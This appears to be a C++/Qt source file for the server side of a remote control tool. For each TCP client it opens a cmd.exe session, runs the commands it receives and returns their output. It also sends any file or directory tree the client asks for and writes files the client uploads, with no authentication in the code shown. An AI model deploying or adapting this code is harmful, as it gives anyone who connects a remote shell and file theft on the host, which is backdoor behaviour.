#include "Socket.h"

Socket::Socket(qintptr descriptor, QObject* parent) : QObject(parent),descriptor(descriptor)
{

}

Socket::~Socket()
{
	socket->close();
}


void Socket::run()
{
	socket = new QTcpSocket;
	socket->setSocketDescriptor(descriptor);
	connect(socket, &QTcpSocket::readyRead, this, &Socket::slotRead,Qt::DirectConnection);
	connect(socket, &QTcpSocket::disconnected, this, &Socket::slotDeleteSocket,Qt::DirectConnection);

	proc = new QProcess(this);
	startProcc(proc);
	start_sock = true;

	sendData(type::connection_successful);
}

void Socket::slotRead() {
	QDataStream stream(socket);
	while (socket->bytesAvailable() > 0) {
		if (nextBlockSize == 0) {
			QByteArray arr;
			arr.append(socket->read(sizeof(int)));
			arr.append(socket->read(sizeof(int)));
			QDataStream s(arr);
			s >> nextBlockSize >> current_command;
		}
		buff_data.append(socket->read(nextBlockSize - buff_data.size()));
		if (buff_data.size() >= nextBlockSize) {
			nextBlockSize = 0;
			QByteArray send_data;
			QDataStream in(buff_data);
			in >> send_data;
			interpretation(send_data, current_command);
			int c = (int)current_command;
			emit signal_GiveMessage(this, send_data, c);
			buff_data.clear();
			current_command = type::null_command;
		}
	}
}

void Socket::interpretation(QByteArray data, type command)
{
	switch (command)
	{
	case type::console_command: {
		QDataStream stream(data);
		QString str;
		stream >> str;
		str += '\n';
		proc->write(str.toStdString().c_str());
		proc->waitForBytesWritten();
		proc->waitForReadyRead();
		QByteArray sendData = proc->readAllStandardOutput();
		this->sendData(sendData, type::console_response);
	}; break;
	case type::download: {
		QDataStream stream(data);
		QString path;
		stream >> path;
		QFileInfo info(path);
		if (info.isDir()) {
			this->downloadDir(path, type::save_dir);
		}
		else {
			this->downloadFile(path, type::save_file);
		}
	}; break;
	case type::save_file: {
		QDataStream stream(data);
		QByteArray data_file;
		QString path;
		stream >> path >> data_file;
		QString unsave_file_path = saveFile(data_file, path);
		if (unsave_file_path != "") {
			sendMessage("file was not created", unsave_file_path);
		}
	}; break;
	case type::save_dir: {
		QDataStream stream(data);
		QByteArray data_file;
		QString path;
		QString dir_path;
		stream >> dir_path >> path >> data_file;
		QString unsave_file_path = saveDir(data_file, path, dir_path);
		if (unsave_file_path != "") {
			sendMessage("file was not created", unsave_file_path);
		}
	}; break;
	case type::tail_message: {
		sendTailMessage();
	}; break;
	default: sendMessage("unknown command", ""); break;
	}
}

void Socket::downloadDir(QString path, type command)
{
	QFileInfo info_of_file(path);
	if (!info_of_file.exists()) {
		sendMessage("file does not exist", path);
		return;
	}
	std::stack<QString> stack;
	stack.push(path);
	while (!stack.empty()) {
		QDir dir(stack.top());
		QString mask = "*";
		QStringList fileList = dir.entryList(mask.split(" "), QDir::Files);
		dir.setSorting(QDir::Size);
		for (QString file : fileList) {
			QString path = dir.absoluteFilePath(file);
			this->downloadFile(path, command);
		}
		stack.pop();
		QStringList dirList = dir.entryList(QDir::Dirs);
		for (QString subdirs : dirList) {
			if (subdirs == "." || subdirs == "..")
				continue;
			stack.push(dir.absoluteFilePath(subdirs));
		}
	}
}

void Socket::downloadFile(QString path, type command)
{
	QFile file(path);
	if (file.open(QIODevice::ReadOnly)) {
		QByteArray send_data;
		QDataStream stream_data(&send_data, QIODevice::WriteOnly);
		stream_data << path << file.readAll();
		this->sendData(send_data, command);
	}
	else {
		sendMessage("file does not exist ", path);
	}
}

void Socket::sendData(QByteArray& data, type command) {
	QDataStream stream(socket);
	int size = data.size() + sizeof(int);
	stream << size << command << data;
}

void Socket::sendData(type command)
{
	QByteArray data = "empty data";
	sendData(data, command);
}

int Socket::getDescriptor()
{
	return this->descriptor;
}

void Socket::slotDeleteSocket()
{
	socket->close();
	socket->deleteLater();
	emit signal_SocketDeleted(descriptor);
}

void Socket::sendMessage(QString message, QString path)
{
	QByteArray message_data;
	QDataStream stream(&message_data, QIODevice::WriteOnly);
	stream << (message + " " + path);
	sendData(message_data, type::message);
}

void Socket::startProcc(QProcess* proc)
{
	proc->setWorkingDirectory("C:\\Windows\\System32\\");
	QString str = "cmd.exe";
	proc->start(str);
}

void Socket::sendTailMessage()
{
	sendData(type::tail_message);
}
